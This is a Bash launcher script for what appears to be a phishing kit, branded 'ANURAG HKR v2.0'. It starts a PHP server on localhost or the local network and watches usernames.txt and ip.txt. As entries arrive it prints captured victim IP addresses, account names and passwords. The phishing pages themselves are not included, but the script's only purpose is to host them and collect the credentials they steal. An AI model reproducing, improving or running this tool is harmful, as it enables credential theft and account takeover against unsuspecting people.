#!/bin/bash

# --- COLORS (रंगों की सेटिंग) ---
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# --- CLEANUP (Ctrl+C दबाने पर बंद करना) ---
trap "echo -e '\n${RED}[!] Stopping Server... Exiting.${NC}'; kill $PID_PHP 2>/dev/null; exit" SIGINT SIGTERM

# --- CLEAR SCREEN & LOGS ---
clear
rm -rf usernames.txt ip.txt
touch usernames.txt ip.txt

# --- BANNER (ANURAG HKR LOGO) ---
echo -e "${BLUE}"
echo "    _    _   _ _   _ ____      _    ____ "
echo "   / \  | \ | | | | |  _ \    / \  / ___|"
echo "  / _ \ |  \| | | | | |_) |  / _ \| |  _ "
echo " / ___ \| |\  | |_| |  _ <  / ___ \ |_| |"
echo "/_/   \_\_| \_|\___/|_| \_\/_/   \_\____|"
echo ""
echo " _   _ _  _______  "
echo "| | | | |/ /  _  \ "
echo "| |_| | ' /| |_) | "
echo "|  _  | . \|  _ <  "
echo "|_| |_|_|\_\_| \_\ "
echo -e "${WHITE}         v2.0 (By Anurag)${NC}"
echo ""

# --- MENU ---
echo -e "${RED}[${WHITE}01${RED}]${CYAN} Localhost ${WHITE}(127.0.0.1)"
echo -e "${RED}[${WHITE}02${RED}]${CYAN} Local Network ${GREEN}[WiFi/LAN]"
echo ""

# --- SELECTION ---
echo -ne "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${NC}"
read -n 1 option
echo ""
echo ""

# --- SERVER LOGIC ---
if [[ $option == "1" ]]; then
    HOST="127.0.0.1"
    PORT="8080"
elif [[ $option == "2" ]]; then
    HOST="0.0.0.0"
    PORT="8080"
else
    echo -e "${RED}[!] Invalid Option!${NC}"
    exit 1
fi

# --- STARTING SERVER ---
echo -e "${YELLOW}[*] Starting PHP Server...${NC}"
# Server Background Me Start Hoga
php -S $HOST:$PORT > /dev/null 2>&1 & 
PID_PHP=$! 

sleep 2
echo -e "${GREEN}[-] Hosted Successfully at : ${WHITE}http://$HOST:$PORT ${NC}"
echo -e "${YELLOW}[-] Waiting for Login Info, ${RED}Ctrl + C ${YELLOW}to exit ...${NC}"
echo ""

# --- LIVE MONITORING (Jadoo) ---
tail -f usernames.txt ip.txt --pid=$PID_PHP 2>/dev/null | while read line; do
    
    if [[ "$line" == "IP:"* ]]; then
        echo -e "${GREEN}[+] Victim IP Found !${NC}"
        echo -e "${CYAN}[-] $line ${NC}"
    
    elif [[ "$line" == *"Login info Found"* ]]; then
        echo -e "${GREEN}$line${NC}"
    
    elif [[ "$line" == *"Account"* || "$line" == *"Password"* ]]; then
        echo -e "${CYAN}$line${NC}"
    
    else
        echo -e "${YELLOW}$line${NC}"
    fi

done
